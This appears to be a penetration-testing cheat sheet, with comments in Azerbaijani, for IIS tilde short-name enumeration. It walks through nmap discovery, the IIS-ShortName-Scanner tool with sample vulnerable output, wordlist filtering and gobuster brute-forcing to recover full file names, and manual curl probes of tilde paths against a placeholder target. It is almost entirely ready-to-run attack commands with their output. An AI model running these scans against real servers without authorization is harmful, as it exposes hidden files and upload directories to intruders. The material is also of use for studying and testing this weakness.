# Discovery
```powershell
sudo nmap -p- -sV -sC --open <TARGET_IP>

# Axtarılacaq:
# Microsoft-IIS/7.5  ← tilde enumeration mümkündür
# http-methods: TRACE ← risk işarəsi

GET /~a  → 404  → 'a' ilə başlayan qovluq/fayl yoxdur
GET /~s  → 200  → 's' ilə başlayan bir şey var!
GET /~se → 200  → 'se' ilə başlayır
GET /~sec→ 200  → 'sec' ilə başlayır
...
→ SECRET~1 tapıldı!
```

#  IIS-ShortName-Scanner ilə Avtomatik Enumeration
```powershell
# Java tələb olunur
java -version

# Scanner-i yüklə
git clone https://github.com/irsdl/IIS-ShortName-Scanner
cd IIS-ShortName-Scanner

java -jar iis_shortname_scanner.jar 0 5 http://<TARGET>/

# Parametrlər:
# 0 → thread sayı (0 = auto)
# 5 → retry sayı


|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
|_ Identified files: 3
    |_ CSASPX~1.CS
    |_ TRANSF~1.ASP
```

# Full Name Dumping
```powershell
# Qısa addan tam adı tap
# Nümunə: TRANSF~1 → transfer*.aspx

egrep -r ^transf /usr/share/wordlists/* | \
  sed 's/^[^:]*://' > /tmp/list.txt

# Yoxla
wc -l /tmp/list.txt
head /tmp/list.txt

gobuster dir \
  -u http://<TARGET>/ \
  -w /tmp/list.txt \
  -x .aspx,.asp,.txt,.html

# Nümunə nəticə:
# /transfer.aspx  (Status: 200)

# .cs faylları üçün
egrep -r ^csaspx /usr/share/wordlists/* | \
  sed 's/^[^:]*://' > /tmp/cs_list.txt

gobuster dir -u http://<TARGET>/ \
  -w /tmp/cs_list.txt -x .cs,.aspx
```

# Manual HTTP Enumeration
```powershell
# Tilde ilə birbaşa yoxla
curl -s -o /dev/null -w "%{http_code}" \
  "http://<TARGET>/~s"

# Qısa adla fayla giriş
curl "http://<TARGET>/secret~1/somefi~1.txt"

# OPTIONS metodu ilə yoxla
curl -X OPTIONS "http://<TARGET>/~1/"

# Qovluğa giriş
http://<TARGET>/UPLOAD~1/
http://<TARGET>/ASPNET~1/

# Fayla giriş
http://<TARGET>/TRANSF~1.ASP
http://<TARGET>/transfer.aspx   ← tam ad tapıldıqdan sonra
```
